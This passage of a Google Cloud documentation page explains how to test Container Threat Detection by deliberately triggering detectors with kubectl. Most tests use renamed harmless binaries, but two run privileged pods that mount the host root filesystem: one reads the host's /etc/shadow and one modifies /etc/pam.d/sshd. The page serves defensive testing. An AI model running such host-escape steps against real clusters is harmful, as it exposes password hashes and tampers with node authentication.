---
url: https://docs.cloud.google.com/security-command-center/docs/how-to-test-container-threat-detection/
title: Testing Container Threat Detection \u00a0|\u00a0 Security Command Center \u00a0|\u00a0 Google Cloud Documentation
method: scrapling+scrapegraph
fetched_at: 2026-10-23T11:30:48.847347+00:00
---

# Testing Container Threat Detection  |  Security Command Center  |  Google Cloud Documentation

> Source: https://docs.cloud.google.com/security-command-center/docs/how-to-test-container-threat-detection/

  * [ Home ](https://docs.cloud.google.com/)
  * [ Documentation ](https://docs.cloud.google.com/docs)
  * [ Security ](https://docs.cloud.google.com/docs/security)
  * [ Security Command Center ](https://docs.cloud.google.com/security-command-center/docs)
  * [ Guides ](https://docs.cloud.google.com/security-command-center/docs/security-command-center-overview)



Send feedback 

#  Testing Container Threat Detection Stay organized with collections  Save and categorize content based on your preferences. 

Premium and Enterprise (Deprecated) [service tiers](https://docs.cloud.google.com/security-command-center/docs/service-tiers) The Security Command Center Enterprise service tier will shut down on May 21, 2027. If your organization uses the Enterprise service tier, then the organization will automatically move to the Premium service tier on or after May 21, 2027. Contact your account representative or a [Google Cloud sales specialist](https://cloud.google.com/contact) if you have questions. 

This page explains how to verify that Container Threat Detection is working by intentionally triggering detectors and checking for findings. To view Container Threat Detection findings, Container Threat Detection must be enabled in Security Command Center [Services](https://docs.cloud.google.com/security-command-center/docs/how-to-configure-security-command-center#enable-service) settings.

## Before you begin

To detect potential threats to your containers, you need to make sure that your clusters are on a supported version of Google Kubernetes Engine (GKE). For more information, see [Using a supported GKE version](https://docs.cloud.google.com/security-command-center/docs/how-to-use-container-threat-detection#gke-version). If you want to test threat detection on ARM, you need a cluster with a node pool containing ARM instances. For more information, see [Arm workloads on GKE](https://docs.cloud.google.com/kubernetes-engine/docs/concepts/arm-on-gke).

## Check a detector's status

You can only test detectors that are enabled. Before you test a detector, confirm that it's enabled.

### Console

If the Container Threat Detection service is enabled, you can set the enablement state of its individual modules.

  1. In the Google Cloud console, go to the **Modules** page for Container Threat Detection. 

[Go to Modules](https://console.cloud.google.com/projectselector2/security/command-center/config/services/container-threat-detection/modules?supportedpurview=organizationId,project)

  2. Select your organization or project.
  3. On the **Modules** tab, in the **Status** column, select the current status of the module that you want to enable or disable, and then select one of the following: 
     * **Enable** : Enable the module.
     * **Disable** : Disable the module.



### gcloud

The [`gcloud scc manage services describe`](https://docs.cloud.google.com/sdk/gcloud/reference/scc/manage/services/describe) command gets the state of a Security Command Center service or module. 

Before using any of the command data below, make the following replacements: 

  * `RESOURCE_TYPE`: the type of resource to get (`organization`, `folder`, or `project`) 
  * `RESOURCE_ID`: the numeric identifier for the organization, folder, or project to get. For projects, you can also use the alphanumeric project ID. 



Execute the [`gcloud scc manage services describe`](https://docs.cloud.google.com/sdk/gcloud/reference/scc/manage/services/describe) command: 

#### Linux, macOS, or Cloud Shell
    
    
    gcloud scc manage services describe container-threat-detection \
        --RESOURCE_TYPE=RESOURCE_ID

#### Windows (PowerShell)
    
    
    gcloud scc manage services describe container-threat-detection `
        --RESOURCE_TYPE=RESOURCE_ID

#### Windows (cmd.exe)
    
    
    gcloud scc manage services describe container-threat-detection ^
        --RESOURCE_TYPE=RESOURCE_ID

You should receive a response similar to the following. For brevity, this example shows a subset of all Container Threat Detection modules. 
    
    
    effectiveEnablementState: ENABLED
    intendedEnablementState: ENABLED
    modules:
      ABUSE_SUDO_FOR_PRIVILEGE_ESCALATION:
        effectiveEnablementState: ENABLED
      ACCESS_SENSITIVE_FILES_ON_NODES:
        effectiveEnablementState: DISABLED
      ADDED_BINARY_EXECUTED:
        effectiveEnablementState: DISABLED
        intendedEnablementState: DISABLED
      ADDED_LIBRARY_LOADED:
        effectiveEnablementState: DISABLED
        intendedEnablementState: DISABLED
      ADDED_MALICIOUS_BINARY_EXECUTED:
        effectiveEnablementState: ENABLED
      ADDED_MALICIOUS_LIBRARY_LOADED:
        effectiveEnablementState: ENABLED
    name: organizations/732774606193/locations/global/securityCenterServices/CONTAINER_THREAT_DETECTION
    updateTime: '2025-11-12T03:22:07Z'
    

### REST

The Security Command Center Management API's `RESOURCE_TYPE.locations.securityCenterServices.get` method gets the state of a Security Command Center service or module. 

Before using any of the request data, make the following replacements: 

  * `RESOURCE_TYPE`: the type of resource to get (`organizations`, `folders`, or `projects`). 
  * `QUOTA_PROJECT`: the project ID to use for billing and quota tracking. 
  * `RESOURCE_ID`: the numeric identifier for the organization, folder, or project to get. For projects, you can also use the alphanumeric project ID. 



HTTP method and URL: 
    
    
    GET https://securitycentermanagement.googleapis.com/v1/RESOURCE_TYPE/RESOURCE_ID/locations/global/securityCenterServices/container-threat-detection

To send your request, expand one of these options:

#### curl (Linux, macOS, or Cloud Shell)

**Note:** The following command assumes that you have logged in to the `gcloud` CLI with your user account by running [`gcloud init`](https://docs.cloud.google.com/sdk/gcloud/reference/init) or [`gcloud auth login`](https://docs.cloud.google.com/sdk/gcloud/reference/auth/login) , or by using [Cloud Shell](https://docs.cloud.google.com/shell/docs), which automatically logs you into the `gcloud` CLI . You can check the currently active account by running [`gcloud auth list`](https://docs.cloud.google.com/sdk/gcloud/reference/auth/list). 

Execute the following command: 
    
    
    curl -X GET \  
         -H "Authorization: Bearer $(gcloud auth print-access-token)" \  
         -H "x-goog-user-project: QUOTA_PROJECT" \  
         "https://securitycentermanagement.googleapis.com/v1/RESOURCE_TYPE/RESOURCE_ID/locations/global/securityCenterServices/container-threat-detection"

#### PowerShell (Windows)

**Note:** The following command assumes that you have logged in to the `gcloud` CLI with your user account by running [`gcloud init`](https://docs.cloud.google.com/sdk/gcloud/reference/init) or [`gcloud auth login`](https://docs.cloud.google.com/sdk/gcloud/reference/auth/login) . You can check the currently active account by running [`gcloud auth list`](https://docs.cloud.google.com/sdk/gcloud/reference/auth/list). 

Execute the following command: 
    
    
    $cred = gcloud auth print-access-token  
    $headers = @{ "Authorization" = "Bearer $cred"; "x-goog-user-project" = "QUOTA_PROJECT" }  
      
    Invoke-WebRequest `  
        -Method GET `  
        -Headers $headers `  
        -Uri "https://securitycentermanagement.googleapis.com/v1/RESOURCE_TYPE/RESOURCE_ID/locations/global/securityCenterServices/container-threat-detection" | Select-Object -Expand Content

You should receive a response similar to the following. For brevity, this example shows a subset of all Container Threat Detection modules. 
    
    
    {
      "effectiveEnablementState": "ENABLED",
      "intendedEnablementState": "ENABLED",
      "modules": {
        "ABUSE_SUDO_FOR_PRIVILEGE_ESCALATION": {
          "effectiveEnablementState": "ENABLED"
        },
        "ACCESS_SENSITIVE_FILES_ON_NODES": {
          "effectiveEnablementState": "DISABLED"
        },
        "ADDED_BINARY_EXECUTED": {
          "effectiveEnablementState": "DISABLED",
          "intendedEnablementState": "DISABLED"
        },
        "ADDED_LIBRARY_LOADED": {
          "effectiveEnablementState": "DISABLED",
          "intendedEnablementState": "DISABLED"
        },
        "ADDED_MALICIOUS_BINARY_EXECUTED": {
          "effectiveEnablementState": "ENABLED"
        },
        "ADDED_MALICIOUS_LIBRARY_LOADED": {
          "effectiveEnablementState": "ENABLED"
        }
      },
      "name": "organizations/732774606193/locations/global/securityCenterServices/CONTAINER_THREAT_DETECTION",
      "updateTime": "2025-11-12T03:22:07Z"
    }
    

## Enable detectors

If a detector is disabled, and you want to test it, then you must enable it first.

Some detectors are disabled by default. For details, see [Disabled detectors](https://docs.cloud.google.com/security-command-center/docs/concepts-container-threat-detection-overview#disabled-detectors).

### Console

If the Container Threat Detection service is enabled, you can set the enablement state of its individual modules.

  1. In the Google Cloud console, go to the **Modules** page for Container Threat Detection. 

[Go to Modules](https://console.cloud.google.com/projectselector2/security/command-center/config/services/container-threat-detection/modules?supportedpurview=organizationId,project)

  2. Select your organization or project.
  3. On the **Modules** tab, in the **Status** column, select the current status of the module that you want to enable or disable, and then select one of the following: 
     * **Enable** : Enable the module.
     * **Disable** : Disable the module.



### gcloud

The [`gcloud scc manage services update`](https://docs.cloud.google.com/sdk/gcloud/reference/scc/manage/services/update) command updates the state of a Security Command Center service or module. 

Before using any of the command data below, make the following replacements: 

  * `RESOURCE_TYPE`: the type of resource to update (`organization`, `folder`, or `project`). 
  * `RESOURCE_ID`: the numeric identifier for the organization, folder, or project to update. For projects, you can also use the alphanumeric project ID. 
  * `MODULE_NAME`: the name of the module to enable or disable. For valid values, see [Container Threat Detection detectors](https://docs.cloud.google.com/security-command-center/docs/concepts-container-threat-detection-overview#detectors). 



Save the following content in a file called `request.json`: 
    
    
    {
      "MODULE_NAME": {
        "intendedEnablementState": "ENABLED"
      }
    }

Execute the [`gcloud scc manage services update`](https://docs.cloud.google.com/sdk/gcloud/reference/scc/manage/services/update) command: 

#### Linux, macOS, or Cloud Shell
    
    
    gcloud scc manage services update container-threat-detection \
        --RESOURCE_TYPE=RESOURCE_ID \
        --module-config-file=request.json

#### Windows (PowerShell)
    
    
    gcloud scc manage services update container-threat-detection `
        --RESOURCE_TYPE=RESOURCE_ID `
        --module-config-file=request.json

#### Windows (cmd.exe)
    
    
    gcloud scc manage services update container-threat-detection ^
        --RESOURCE_TYPE=RESOURCE_ID ^
        --module-config-file=request.json

You should receive a response similar to the following. For brevity, this example shows a subset of all Container Threat Detection modules. 
    
    
    effectiveEnablementState: ENABLED
    intendedEnablementState: ENABLED
    modules:
      ABUSE_SUDO_FOR_PRIVILEGE_ESCALATION:
        effectiveEnablementState: ENABLED
      ACCESS_SENSITIVE_FILES_ON_NODES:
        effectiveEnablementState: DISABLED
      ADDED_BINARY_EXECUTED:
        effectiveEnablementState: DISABLED
        intendedEnablementState: DISABLED
      ADDED_LIBRARY_LOADED:
        effectiveEnablementState: DISABLED
        intendedEnablementState: DISABLED
      ADDED_MALICIOUS_BINARY_EXECUTED:
        effectiveEnablementState: ENABLED
      ADDED_MALICIOUS_LIBRARY_LOADED:
        effectiveEnablementState: ENABLED
    name: organizations/732774606193/locations/global/securityCenterServices/CONTAINER_THREAT_DETECTION
    updateTime: '2025-11-12T03:22:07Z'
    

### REST

The Security Command Center Management API's `[RESOURCE_TYPE.locations.securityCenterServices.patch](https://docs.cloud.google.com/security-command-center/docs/reference/security-center-management/rest/v1/organizations.locations.securityCenterServices/patch)` method updates the state of a Security Command Center service or module. 

Before using any of the request data, make the following replacements: 

  * `RESOURCE_TYPE`: the type of resource to update (`organizations`, `folders`, or `projects`). 
  * `QUOTA_PROJECT`: the project ID to use for billing and quota tracking. 
  * `RESOURCE_ID`: the numeric identifier for the organization, folder, or project to update. For projects, you can also use the alphanumeric project ID. 
  * `MODULE_NAME`: the name of the module to enable or disable. For valid values, see [Container Threat Detection detectors](https://docs.cloud.google.com/security-command-center/docs/concepts-container-threat-detection-overview#detectors). 



HTTP method and URL: 
    
    
    PATCH https://securitycentermanagement.googleapis.com/v1/RESOURCE_TYPE/RESOURCE_ID/locations/global/securityCenterServices/container-threat-detection?updateMask=modules

Request JSON body: 
    
    
    {
      "modules": {
        "MODULE_NAME": {
          "intendedEnablementState": "ENABLED"
        }
      }
    }
    

To send your request, expand one of these options:

#### curl (Linux, macOS, or Cloud Shell)

**Note:** The following command assumes that you have logged in to the `gcloud` CLI with your user account by running [`gcloud init`](https://docs.cloud.google.com/sdk/gcloud/reference/init) or [`gcloud auth login`](https://docs.cloud.google.com/sdk/gcloud/reference/auth/login) , or by using [Cloud Shell](https://docs.cloud.google.com/shell/docs), which automatically logs you into the `gcloud` CLI . You can check the currently active account by running [`gcloud auth list`](https://docs.cloud.google.com/sdk/gcloud/reference/auth/list). 

Save the request body in a file named `request.json`, and execute the following command: 
    
    
    curl -X PATCH \  
         -H "Authorization: Bearer $(gcloud auth print-access-token)" \  
         -H "x-goog-user-project: QUOTA_PROJECT" \  
         -H "Content-Type: application/json; charset=utf-8" \  
         -d @request.json \  
         "https://securitycentermanagement.googleapis.com/v1/RESOURCE_TYPE/RESOURCE_ID/locations/global/securityCenterServices/container-threat-detection?updateMask=modules"

#### PowerShell (Windows)

**Note:** The following command assumes that you have logged in to the `gcloud` CLI with your user account by running [`gcloud init`](https://docs.cloud.google.com/sdk/gcloud/reference/init) or [`gcloud auth login`](https://docs.cloud.google.com/sdk/gcloud/reference/auth/login) . You can check the currently active account by running [`gcloud auth list`](https://docs.cloud.google.com/sdk/gcloud/reference/auth/list). 

Save the request body in a file named `request.json`, and execute the following command: 
    
    
    $cred = gcloud auth print-access-token  
    $headers = @{ "Authorization" = "Bearer $cred"; "x-goog-user-project" = "QUOTA_PROJECT" }  
      
    Invoke-WebRequest `  
        -Method PATCH `  
        -Headers $headers `  
        -ContentType: "application/json; charset=utf-8" `  
        -InFile request.json `  
        -Uri "https://securitycentermanagement.googleapis.com/v1/RESOURCE_TYPE/RESOURCE_ID/locations/global/securityCenterServices/container-threat-detection?updateMask=modules" | Select-Object -Expand Content

You should receive a response similar to the following. For brevity, this example shows a subset of all Container Threat Detection modules. 
    
    
    {
      "effectiveEnablementState": "ENABLED",
      "intendedEnablementState": "ENABLED",
      "modules": {
        "ABUSE_SUDO_FOR_PRIVILEGE_ESCALATION": {
          "effectiveEnablementState": "ENABLED"
        },
        "ACCESS_SENSITIVE_FILES_ON_NODES": {
          "effectiveEnablementState": "DISABLED"
        },
        "ADDED_BINARY_EXECUTED": {
          "effectiveEnablementState": "DISABLED",
          "intendedEnablementState": "DISABLED"
        },
        "ADDED_LIBRARY_LOADED": {
          "effectiveEnablementState": "DISABLED",
          "intendedEnablementState": "DISABLED"
        },
        "ADDED_MALICIOUS_BINARY_EXECUTED": {
          "effectiveEnablementState": "ENABLED"
        },
        "ADDED_MALICIOUS_LIBRARY_LOADED": {
          "effectiveEnablementState": "ENABLED"
        }
      },
      "name": "organizations/732774606193/locations/global/securityCenterServices/CONTAINER_THREAT_DETECTION",
      "updateTime": "2025-11-12T03:22:07Z"
    }
    

## Set environment variables

To test detectors, use the Google Cloud console and Cloud Shell. You can set environment variables in Cloud Shell to make it easier to run commands. The following variables are used to test all Container Threat Detection detectors.

  1. Go to the [Google Cloud console](https://console.cloud.google.com/projectselector2).

[Go to the Google Cloud console](https://console.cloud.google.com/projectselector2)

  2. Select the project that contains the container you want to use to test.

  3. Click **Activate Cloud Shell**. ![](https://docs.cloud.google.com/static/security-command-center/images/activate-cloud-shell.svg)

  4. In Cloud Shell, set environment variables.

     1. The zone your cluster is in:
            
            export ZONE=CLUSTER_ZONE
            

     2. The project your container is in:
            
            export PROJECT=PROJECT_ID
            

     3. Your cluster name:
            
            export CLUSTER_NAME=CLUSTER_NAME
            




The variables are set. The following sections include instructions for testing Container Threat Detection detectors.

## Added Binary Executed

To trigger an Added Binary Executed finding, drop a binary in your container and execute it. This example deploys the latest Ubuntu 24.04 image, copies `/bin/ls` to another location, and then executes it. The binary's execution is unexpected because the copy of the binary wasn't part of the original container image, even when that image is on Ubuntu 24.04, and containers are meant to be immutable.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Drop a binary and execute it:

     * x86 node:
           
           tag="ktd-test-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
               --restart=Never \
               --rm=true -i \
               --image marketplace.gcr.io/google/ubuntu2404:latest \
               "$tag" -- sh -c "cp /bin/ls /tmp/$tag; /tmp/$tag"
           

     * ARM node:
           
           tag="ktd-test-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
               --restart=Never \
               --rm=true -i \
               --image marketplace.gcr.io/google/ubuntu2404:latest \
               --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
               {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
               "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
               "value": "arm64" } ]}}' \
               "$tag" -- sh -c "cp /bin/ls /tmp/$tag; /tmp/$tag"
           




This test procedure creates an Added Binary Executed finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

For noise reduction, when you first create a container, Container Threat Detection temporarily filters out Added Binary Executed findings. To see all Added Binary Executed findings while setting up a container, prefix your container name or Pod name with `ktd-test`, as in the example.

## Added Library Loaded

To trigger an Added Library Loaded finding, drop a library in your container and then load it. This example deploys the latest Ubuntu 24.04 image, copies `/lib/x86_64-linux-gnu/libc.so.6` to another location, and then loads it using `ld`. The loaded library is unexpected because the copy of the library was not part of the original container image, even if that image is on Ubuntu 24.04, and containers are meant to be immutable.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Drop a library and use `ld` to load it:

     * x86 node:
           
           tag="ktd-test-library-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- sh -c \
                 "cp /lib/x86_64-linux-gnu/libc.so.6 /tmp/$tag; /lib64/ld-linux-x86-64.so.2 /tmp/$tag"
           

     * ARM node:
           
           tag="ktd-test-library-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- sh -c \
                 "cp /lib/aarch64-linux-gnu/libc.so.6 /tmp/$tag; /lib/ld-linux-aarch64.so.1 /tmp/$tag"
           




This test procedure creates an Added Library Loaded finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center at the organization level.

For noise reduction, when you first create a container, Container Threat Detection temporarily filters out Added Library Loaded findings. To see all Added Library Loaded findings while setting up a container, prefix your container name or Pod name with `ktd-test`, as in the example.

## Collection: Pam.d Modification ([Preview](https://cloud.google.com/products/#product-launch-stages))

To trigger a pam.d modification detection, modify one of the host's PAM related files. This example deploys the latest Ubuntu 24.04 image, mounting the host's root file system into the container, and then modifies `/etc/pam.d/sshd`.

This is a file monitoring detector and has [specific GKE version requirements](https://cloud.google.com/security-command-center/docs/how-to-use-container-threat-detection#gke-version).

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute a binary that modifies one of the PAM related files on the host.

     * x86 node:
           
           tag="ktd-test-pamd-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never --rm=true -ti --image ubuntu "$tag"\
              --overrides='{"apiVersion": "v1", "spec": {
              "containers":[{"command": ["sh", "-c", "/bin/echo >> /host/etc/pam.d/sshd"],
              "name": "'$tag'", "image": "marketplace.gcr.io/google/ubuntu2404:latest",
              "securityContext": {"privileged": true},
              "volumeMounts":[{"mountPath": "/host/", "name": "host-mount",
              "readOnly": false}]}],
              "volumes": [{"name": "host-mount","hostPath": {"path": "/"}}]}}'
           

     * ARM node:
           
           tag="ktd-test-pamd-arm-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never --rm=true -ti --image ubuntu "$tag"\
              --overrides='{"apiVersion": "v1", "spec": {
              "containers":[{"command": ["sh", "-c", "/bin/echo >> /host/etc/pam.d/sshd"],
              "name": "'$tag'", "image": "marketplace.gcr.io/google/ubuntu2404:latest",
              "securityContext": {"privileged": true},
              "volumeMounts":[{"mountPath": "/host/", "name": "host-mount",
              "readOnly": false}]}],
              "volumes": [{"name": "host-mount","hostPath": {"path": "/"}}],
              "nodeSelector": {"kubernetes.io/arch":"arm64"}, "tolerations":[{ "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" }] }}'
           




This test procedure triggers a pam.d modification finding that you can view in Security Command Center and, if you have configured Logging for Container Threat Detection, in Cloud Logging. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center at the organization level.

## Command and Control: Piped Encoded Code Execution

To trigger a `Command and Control: Piped Encoded Code Execution` finding, a binary capable of code execution such as `python` must have a `base64` decode command piped into its execution. This example uses the latest Ubuntu 24.04 image. It uses `echo` to pipe an encoded string that prints `Hello World` to the `python` executable. This behavior is flagged as suspicious because it can indicate an attempt to run a malicious script by an attacker.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Decode and pipe a base64-encoded string into `python`:

     * x86 node:
           
           tag="ktd-test-piped-exec-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "cp /bin/echo /tmp/python; echo \"cHJpbnQoJ0hlbGxvIFdvcmxkJyk=\" | base64 -d | /tmp/python; sleep 10"
           

     * ARM node:
           
           tag="ktd-test-piped-exec-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "cp /bin/echo /tmp/python; echo \"cHJpbnQoJ0hlbGxvIFdvcmxkJyk=\" | base64 -d | /tmp/python; sleep 10"
           




This test procedure creates a `Command and Control: Piped Encoded Code Execution` finding that you can view in Security Command Center and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Command and Control: Piped Encoded Download

To trigger a `Command and Control: Piped Encoded Download` finding, an executable such as `curl` must be piped into a `base64` decode command. This example uses the latest Ubuntu 24.04 image. It copies `/bin/echo` and renames that to `curl` and then pipes a simulated curl call into `base64`. This behavior is flagged as suspicious because it can indicate an attempt to download and decode a malicious script to later be used by an attacker.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute and pipe a `curl` call into `base64 -d`:

     * x86 node:
           
           tag="ktd-test-piped-dl-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "cp /bin/echo /tmp/curl; /tmp/curl \"cHJpbnQoJ0hlbGxvIFdvcmxkJyk=\" | base64 -d; sleep 10"
           

     * ARM node:
           
           tag="ktd-test-piped-dl-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "cp /bin/echo /tmp/curl; /tmp/curl \"cHJpbnQoJ0hlbGxvIFdvcmxkJyk=\" | base64 -d; sleep 10"
           




This test procedure creates a `Command and Control: Piped Encoded Download` finding that you can view in Security Command Center and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Command and Control: Steganography Tool Detected

To trigger a `Command and Control: Steganography Tool Detected` ([Preview](https://cloud.google.com/products/#product-launch-stages)) finding, a binary with file manipulation capabilities consistent with steganography tools must execute within a container. This example uses the latest Ubuntu 24.04 image. It copies `/bin/ls` and renames that to `steghide` (or another steganography tool like `stegano`). This behavior is flagged as suspicious because it can indicate an attempt to prepare a container for hiding or extracting data, potentially for malicious purposes.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute a steganography tool binary like `steghide`:

     * x86 node:
           
           tag="ktd-test-steganography-tool-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/steghide; /tmp/steghide"
           

     * ARM node:
           
           tag="ktd-test-steganography-tool-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/steghide; /tmp/steghide"
           




This test procedure creates a `Command and Control: Steganography Tool Detected` finding that you can view in Security Command Center and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Credential Access: Access Sensitive Files on Nodes ([Preview](https://cloud.google.com/products/#product-launch-stages))

To trigger a Sensitive File Accessed detection, read the host's `/etc/shadow` file. This example deploys the latest Ubuntu 24.04 image, mounting the host's root file system into the container, and then reads `/etc/shadow` using `cat`.

This is a file monitoring detector and has [specific GKE version requirements](https://cloud.google.com/security-command-center/docs/how-to-use-container-threat-detection#gke-version).

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute a binary that reads the host's `/etc/shadow` file.

     * x86 node:
           
           tag="ktd-test-sfa-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never --rm=true -ti --image ubuntu "$tag"\
              --overrides='{"apiVersion": "v1", "spec": {
              "containers":[{"command": ["/bin/cat", "/host/etc/shadow"],
              "name": "'$tag'", "image": "marketplace.gcr.io/google/ubuntu2404:latest",
              "securityContext": {"privileged": true},
              "volumeMounts":[{"mountPath": "/host/", "name": "host-mount",
              "readOnly": false}]}],
              "volumes": [{"name": "host-mount","hostPath": {"path": "/"}}]}}'
           

     * ARM node:
           
           tag="ktd-test-sfa-arm-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never --rm=true -ti --image ubuntu "$tag"\
              --overrides='{"apiVersion": "v1", "spec": {
              "containers":[{"command": ["/bin/cat", "/host/etc/shadow"],
              "name": "'$tag'", "image": "marketplace.gcr.io/google/ubuntu2404:latest",
              "securityContext": {"privileged": true},
              "volumeMounts":[{"mountPath": "/host/", "name": "host-mount",
              "readOnly": false}]}],
              "volumes": [{"name": "host-mount","hostPath": {"path": "/"}}],
              "nodeSelector": {"kubernetes.io/arch":"arm64"}, "tolerations":[{ "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" }] }}'
           




This test procedure triggers a Sensitive File Accessed finding that you can view in Security Command Center and, if you have configured Logging for Container Threat Detection, in Cloud Logging. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center at the organization level.

## Credential Access: Find Google Cloud Credentials

To trigger a `Credential Access: Find Google Cloud Credentials` finding, a binary capable of searching file contents needs to be executed within a container. This example uses the latest Ubuntu 24.04 image. It copies `/bin/ls` and renames that to `grep`. The renamed binary is then executed with arguments that specify a search pattern indicative of a form of Google Cloud credentials. This action is flagged as suspicious because it mimics the behavior observed when attempting to locate Google Cloud credentials.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute a search tool binary like `find` with appropriate arguments:

     * x86 node:
           
           tag="ktd-test-find-gcp-credentials-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/grep; /tmp/grep GOOGLE_APPLICATION_CREDENTIALS"
           

     * ARM node:
           
           tag="ktd-test-find-gcp-credentials-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/grep; /tmp/grep GOOGLE_APPLICATION_CREDENTIALS"
           




This test procedure creates a `Credential Access: Find Google Cloud Credentials` finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Credential Access: GPG Key Reconnaissance

